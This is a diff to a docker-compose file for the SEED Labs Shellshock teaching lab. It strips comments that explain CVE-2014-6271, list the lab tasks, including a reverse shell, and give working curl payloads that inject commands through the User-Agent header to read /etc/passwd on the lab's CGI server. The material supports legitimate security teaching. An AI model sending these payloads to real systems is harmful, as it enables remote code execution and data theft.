@@ -1,79 +1,12 @@
 # ==============================================================================
 # SEED Labs 2.0 — Shellshock Vulnerability Lab
-#
-# Official lab manual:
-#   https://seedsecuritylabs.org/Labs_20.04/Web/Shellshock/
-#
-# Textbook reference (Wenliang Du):
-#   Chapter 3 — Environment Variable and Set-UID Programs
-#   (Shellshock is treated as a case study within the software security chapters)
-#   Computer & Internet Security: A Hands-on Approach
-#
-# CVE references:
-#   CVE-2014-6271 — original Shellshock vulnerability
-#   CVE-2014-7169 — bypass of the initial incomplete patch
-#
-# Background from lab manual, §1:
-#   Bash allows function definitions to be exported as environment variables.
-#   Before the patch, when bash started it would parse these exported function
-#   definitions — and due to a parsing bug, it would also execute any commands
-#   that followed the function body in the environment variable value.
-#
-#   Export syntax used by attackers:
-#     env x='() { :;}; <malicious_commands>' bash -c ""
-#
-#   The part '() { :;}' is a valid function definition. Everything after it
-#   should be ignored. In vulnerable bash, it is executed.
-#
-# CGI exploitation path (from lab manual, §2):
-#   When Apache invokes a CGI script, it sets HTTP request headers as
-#   environment variables before exec-ing the script interpreter (bash):
-#
-#     User-Agent    -> HTTP_USER_AGENT
-#     Referer       -> HTTP_REFERER
-#     Cookie        -> HTTP_COOKIE
-#
-#   If the script uses vulnerable bash (/bin/bash_shellshock), the attacker
-#   can embed a Shellshock payload in any of those headers.
-#
-#   Example attack using curl:
-#     curl -A "() { :;}; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd" \
-#          http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
-#
-# Hosts file entry required:
-#   10.9.0.80   www.seedlab-shellshock.com
-#
-#   Linux / macOS / WSL2:
-#     echo "10.9.0.80   www.seedlab-shellshock.com" | sudo tee -a /etc/hosts
-#
-#   Windows (PowerShell as Administrator):
-#     Add-Content C:\Windows\System32\drivers\etc\hosts "10.9.0.80   www.seedlab-shellshock.com"
 # ==============================================================================
-
-version: "3"
 
 services:
 
   www:
-    # Apache + CGI container with two CGI scripts (from lab manual §2.1):
-    #
-    #   /usr/lib/cgi-bin/vul.cgi
-    #     Uses #!/bin/bash_shellshock — the vulnerable bash binary.
-    #     Any HTTP header reaching this script is passed as an environment
-    #     variable to that vulnerable bash instance. The Shellshock payload
-    #     in the User-Agent will execute before the script body runs.
-    #
-    #   /usr/lib/cgi-bin/safe.cgi
-    #     Uses #!/bin/bash — the patched system bash.
-    #     The same payload sent to this script will NOT execute, because the
-    #     patched bash ignores code after the function body in env vars.
-    #     This lets students confirm that the patch is effective.
-    #
-    # The container's /bin/bash is patched and safe.
-    # The container's /bin/bash_shellshock is the CVE-2014-6271 binary.
-    # The host system's bash is completely unaffected — it is not shared
-    # with the container.
-    image: handsonsecurity/seed-image-www-shellshock
+    build: ./image_www
+    image: seed-image-www-shellshock
     container_name: shellshock-10.9.0.80
     tty: true
     restart: unless-stopped
@@ -81,7 +14,6 @@ services:
       net-10.9.0.0:
         ipv4_address: 10.9.0.80
     ports:
-      # Apache CGI server: http://www.seedlab-shellshock.com
       - "10086:80"
 
 networks:
@@ -90,50 +22,3 @@ networks:
     ipam:
       config:
         - subnet: 10.9.0.0/24
-
-# ==============================================================================
-# Files inside the container (from lab manual §2.1):
-#
-#   /usr/lib/cgi-bin/vul.cgi        vulnerable CGI script (bash_shellshock)
-#   /usr/lib/cgi-bin/safe.cgi       patched CGI script (system bash)
-#   /bin/bash_shellshock            CVE-2014-6271 vulnerable binary
-#   /bin/bash                       patched, modern bash (NOT vulnerable)
-#
-# Lab tasks (from lab manual):
-#
-#   Task 1: Experimenting with bash function export behaviour.
-#           Run bash_shellshock directly and test whether trailing commands
-#           in an exported function execute. Compare with patched bash.
-#
-#   Task 2A: Send a Shellshock payload via User-Agent header.
-#            Retrieve /etc/passwd contents from the server.
-#
-#   Task 2B: Determine what environment variables Apache passes to the CGI
-#            script and try other headers as injection vectors.
-#
-#   Task 3: Establish a reverse shell from the container back to the attacker.
-#           This demonstrates remote code execution, not just data exfiltration.
-#
-# Useful commands while running this lab:
-#
-#   Test the vulnerable CGI endpoint:
-#     curl http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
-#
-#   Shellshock payload to read /etc/passwd:
-#     curl -A "() { :;}; echo Content-Type: text/plain; echo; cat /etc/passwd" \
-#          http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
-#
-#   Test the patched endpoint (same payload, different script):
-#     curl -A "() { :;}; echo Content-Type: text/plain; echo; cat /etc/passwd" \
-#          http://www.seedlab-shellshock.com/cgi-bin/safe.cgi
-#
-#   Enter the container:
-#     docker exec -it shellshock-10.9.0.80 bash
-#
-#   View Apache access log:
-#     docker exec -it shellshock-10.9.0.80 tail -f /var/log/apache2/access.log
-#
-# Resource usage (approximate):
-#   Single container: ~150 MB RAM
-#   Image (disk): ~500 MB
-# ==============================================================================
